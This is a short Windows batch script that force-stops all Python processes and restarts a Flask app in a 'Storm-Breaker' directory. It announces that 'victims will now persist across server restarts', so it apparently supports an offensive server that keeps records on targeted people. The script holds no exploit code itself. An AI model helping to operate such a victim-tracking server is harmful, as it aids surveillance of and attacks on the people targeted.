@echo off
echo ========================================
echo  RESTARTING FLASK SERVER
echo ========================================
echo.
echo Stopping Flask server...
taskkill /F /IM python.exe 2>nul
timeout /t 2 /nobreak >nul

echo.
echo Starting Flask server with DATABASE PERSISTENCE...
cd /d "C:\Users\Administrator\Storm-Breaker\storm-web"
start "Storm-Breaker Server" cmd /k "py app.py"

echo.
echo ========================================
echo  SERVER RESTARTED!
echo ========================================
echo.
echo The Flask server is now running with database persistence.
echo Victims will now persist across server restarts!
echo.
echo Press any key to exit...
pause >nul
